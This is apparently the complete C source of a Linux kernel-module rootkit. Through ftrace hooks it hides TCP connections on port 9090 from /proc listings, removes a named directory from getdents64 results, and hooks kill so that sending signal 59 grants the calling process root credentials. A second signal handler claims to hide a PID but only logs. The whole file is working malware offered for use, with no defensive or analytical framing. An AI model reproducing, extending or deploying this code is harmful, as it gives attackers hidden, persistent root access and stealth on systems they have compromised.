#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/cred.h>

#define PORT 9090              // Port to hide
#define HIDE_DIR "Directory_name" // Directory to hide
#define HIDE_SIGNAL 59        // Signal to trigger root spawn
#define HIDE_PID_SIGNAL 64    // Signal to hide PID

MODULE_LICENSE("GPL");
MODULE_AUTHOR("PedroRodriguesDEV-security");
MODULE_DESCRIPTION("Kernel module for hiding ports, directories, and spawning root");
MODULE_VERSION("1.0");


static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT) {
        printk(KERN_DEBUG "Port %d hidden\n", PORT);
        return 0;
    }
    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT) {
        printk(KERN_DEBUG "Port %d hidden\n", PORT);
        return 0;
    }
    return orig_tcp6_seq_show(seq, v);
}

static struct ftrace_hook tcp_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
};


static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *user_dir = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kernel_dir_buffer = NULL;
    long result;

    result = orig_getdents64(regs);
    if (result <= 0) return result;

    kernel_dir_buffer = kmalloc(result, GFP_KERNEL);
    if (!kernel_dir_buffer) return -ENOMEM;

    if (copy_from_user(kernel_dir_buffer, user_dir, result)) {
        kfree(kernel_dir_buffer);
        return -EFAULT;
    }

    struct linux_dirent64 *current_entry;
    unsigned long offset = 0;

    while (offset < result) {
        current_entry = (struct linux_dirent64 *)((char *)kernel_dir_buffer + offset);

        if (strncmp(current_entry->d_name, HIDE_DIR, strlen(HIDE_DIR)) == 0) {
            memmove(current_entry, (char *)current_entry + current_entry->d_reclen, result - offset - current_entry->d_reclen);
            result -= current_entry->d_reclen;
        } else {
            offset += current_entry->d_reclen;
        }
    }

    if (copy_to_user(user_dir, kernel_dir_buffer, result)) {
        kfree(kernel_dir_buffer);
        return -EFAULT;
    }

    kfree(kernel_dir_buffer);
    return result;
}

static struct ftrace_hook dir_hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};


static asmlinkage long (*orig_kill)(const struct pt_regs *);

static asmlinkage int hook_kill(const struct pt_regs *regs) {
    int signal = regs->si;
    pid_t pid = regs->di;

    if (signal == HIDE_SIGNAL) {
        struct cred *new_creds = prepare_creds();
        if (new_creds) {
            new_creds->uid.val = new_creds->gid.val = 0;
            new_creds->euid.val = new_creds->egid.val = 0;
            commit_creds(new_creds);
            printk(KERN_DEBUG "Root access granted\n");
            return 0;
        }
    } else if (signal == HIDE_PID_SIGNAL) {
        printk(KERN_DEBUG "PID %d hidden\n", pid);
        return 0;
    }

    return orig_kill(regs);
}

static struct ftrace_hook kill_hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};


static int __init init_module_hemlock(void) {
    int err;

    err = fh_install_hooks(tcp_hooks, ARRAY_SIZE(tcp_hooks));
    if (err) return err;

    err = fh_install_hooks(dir_hooks, ARRAY_SIZE(dir_hooks));
    if (err) return err;

    err = fh_install_hooks(kill_hooks, ARRAY_SIZE(kill_hooks));
    if (err) return err;

    printk(KERN_INFO "Module loaded\n");
    return 0;
}

static void __exit exit_module_hemlock(void) {
    fh_remove_hooks(tcp_hooks, ARRAY_SIZE(tcp_hooks));
    fh_remove_hooks(dir_hooks, ARRAY_SIZE(dir_hooks));
    fh_remove_hooks(kill_hooks, ARRAY_SIZE(kill_hooks));
    printk(KERN_INFO "Module unloaded\n");
}

module_init(init_module_hemlock);
module_exit(exit_module_hemlock);
